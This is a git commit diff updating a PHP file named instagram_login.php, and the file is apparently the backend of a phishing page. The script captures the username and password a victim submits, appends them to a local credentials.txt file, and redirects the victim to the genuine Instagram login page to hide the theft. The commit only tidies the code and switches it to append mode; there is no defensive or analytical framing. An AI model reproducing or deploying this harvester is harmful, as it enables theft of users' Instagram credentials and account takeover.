3d861a379c7d52201eed6475c15e602a61a07a1f
Maxpiol <109462038+Maxpiol@users.noreply.github.com>
2024-06-08 17:02:00 +0530

    Update instagram_login.php

--- instagram_login.php
+++ instagram_login.php
@@ -1,9 +1,8 @@
 <?php
-    $username = $_POST['username'];
-    $password = $_POST['password'];
-
-    // Save the captured credentials to a file or database
-    file_put_contents('credentials.txt', $username . ':' . $password);
-
-    // Redirect the user to the real Instagram login page
-    header('Location: https://www.instagram.com/accounts/login/');
+$username = $_POST['username'];
+$password = $_POST['password'];
+// Save the captured credentials to a file
+file_put_contents('credentials.txt', $username . ':' . $password . "\n", FILE_APPEND);
+// Redirect the user to the real Instagram login page
+header('Location: https://www.instagram.com/accounts/login/');
+?>
